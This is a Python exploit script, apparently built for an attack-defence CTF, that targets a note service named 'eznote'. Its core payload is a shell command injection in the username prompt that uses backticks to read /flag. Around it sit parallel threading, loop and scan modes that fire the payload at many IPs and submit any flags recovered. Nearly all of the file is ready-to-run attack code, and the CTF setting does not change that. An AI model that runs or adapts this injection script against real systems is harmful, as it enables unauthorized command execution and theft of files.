#!/usr/bin/env python3
"""
eznote - Speed Optimized Exploit v4
===================================
Fastest possible flag retrieval with parallel execution.

Features:
- Single-packet exploit (minimal round trips)
- Aggressive parallelization  
- Auto-retry on failure
- Smart target prioritization

Usage:
    python3 eznote_exploit_v4.py              # Attack all targets
    python3 eznote_exploit_v4.py --loop       # Continuous attack
    python3 eznote_exploit_v4.py --scan       # Scan vulnerability status
    python3 eznote_exploit_v4.py 172.28.31.33 # Attack specific IP
"""

import sys
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from awd_lib import submit, targets, our_ip, setup_auth

# === CONFIG ===
PORT = 1000
TIMEOUT = 3           # Aggressive timeout
LOOP_DELAY = 15       # Fast rounds
MAX_WORKERS = 16      # Many parallel connections
RETRIES = 1           # Quick retry

context.log_level = 'error'
context.timeout = TIMEOUT

FLAG_RE = re.compile(rb'((?:flag|hkcert\d*|ctf)\{[^}]+\})', re.IGNORECASE)

# Track which targets are vulnerable (skip patched ones in loop mode)
VULN_CACHE = {}


def extract_flag(data):
    """Extract flag from data."""
    if isinstance(data, str):
        data = data.encode()
    m = FLAG_RE.search(data)
    return m.group(1).decode() if m else None


# =============================================================================
# EXPLOIT - Single optimized function
# =============================================================================

def exploit(ip, port):
    """
    Ultra-fast exploit - single connection, minimal packets.
    Returns flag string or None.
    """
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Send exploit payload immediately after banner
        io.recvuntil(b'Username: ', timeout=2)
        io.sendline(b'x`cat /flag>&2`')
        io.recvuntil(b'> ', timeout=2)
        io.sendline(b'2')
        
        # Quick receive
        data = io.recv(512, timeout=1)
        io.close()
        
        return extract_flag(data)
    except:
        return None


def exploit_with_retry(ip, port, retries=RETRIES):
    """Exploit with retry logic."""
    for i in range(retries + 1):
        flag = exploit(ip, port)
        if flag:
            return flag
        if i < retries:
            time.sleep(0.1)  # Brief pause before retry
    return None


# =============================================================================
# RUNNER FUNCTIONS
# =============================================================================

def attack_target(ip):
    """Attack single target, return (ip, flag) or (ip, None)."""
    # Skip known-patched targets in loop mode
    if VULN_CACHE.get(ip) == False:
        return ip, None
    
    flag = exploit_with_retry(ip, PORT)
    
    if flag:
        VULN_CACHE[ip] = True
        result = submit(flag, target=ip, silent=True)
        return ip, flag
    else:
        # Mark as potentially patched after failure
        if ip in VULN_CACHE:
            VULN_CACHE[ip] = False
        return ip, None


def run_all():
    """Attack all targets in parallel."""
    target_list = targets()
    
    start = time.time()
    flags = {}
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = [ex.submit(attack_target, ip) for ip in target_list]
        for f in as_completed(futures):
            ip, flag = f.result()
            if flag:
                flags[ip] = flag
    
    elapsed = time.time() - start
    
    # Summary line
    print(f"[{time.strftime('%H:%M:%S')}] {len(flags)}/{len(target_list)} flags in {elapsed:.2f}s", end="")
    if flags:
        print(f" | {', '.join(flags.keys())}")
    else:
        print()
    
    return flags


def run_loop():
    """Continuous attack loop optimized for AWD."""
    print(f"[*] eznote v4 | Loop mode | {LOOP_DELAY}s delay")
    print(f"[*] Targets: {len(targets())} | Workers: {MAX_WORKERS}")
    print()
    
    round_num = 0
    total_flags = 0
    
    while True:
        round_num += 1
        
        try:
            flags = run_all()
            total_flags += len(flags)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Error: {e}")
        
        try:
            time.sleep(LOOP_DELAY)
        except KeyboardInterrupt:
            break
    
    print(f"\n[*] {round_num} rounds, {total_flags} total flags")


def run_scan():
    """Quick vulnerability scan."""
    print(f"[*] Scanning {len(targets())} targets...\n")
    
    vuln = []
    patched = []
    
    for ip in targets():
        flag = exploit(ip, PORT)
        if flag:
            vuln.append(ip)
            print(f"[+] {ip}: VULNERABLE - {flag[:30]}...")
        else:
            patched.append(ip)
            print(f"[-] {ip}: patched/unreachable")
    
    print(f"\n[*] {len(vuln)} vulnerable, {len(patched)} patched")


def run_single(ip):
    """Attack single target with verbose output."""
    print(f"[*] Attacking {ip}:{PORT}...")
    
    flag = exploit_with_retry(ip, PORT)
    
    if flag:
        print(f"[+] Flag: {flag}")
        result = submit(flag, target=ip)
        print(f"[*] Submit: {'NEW!' if result['success'] and not result.get('duplicate') else 'duplicate'}")
    else:
        print(f"[-] No flag")


# =============================================================================
# MAIN
# =============================================================================

def main():
    try:
        setup_auth()
    except:
        pass
    
    args = sys.argv[1:] if len(sys.argv) > 1 else []
    
    if not args:
        run_all()
    elif args[0] in ("--loop", "-l"):
        run_loop()
    elif args[0] in ("--scan", "-s"):
        run_scan()
    elif args[0] in ("--help", "-h"):
        print(__doc__)
    else:
        run_single(args[0])


if __name__ == "__main__":
    main()
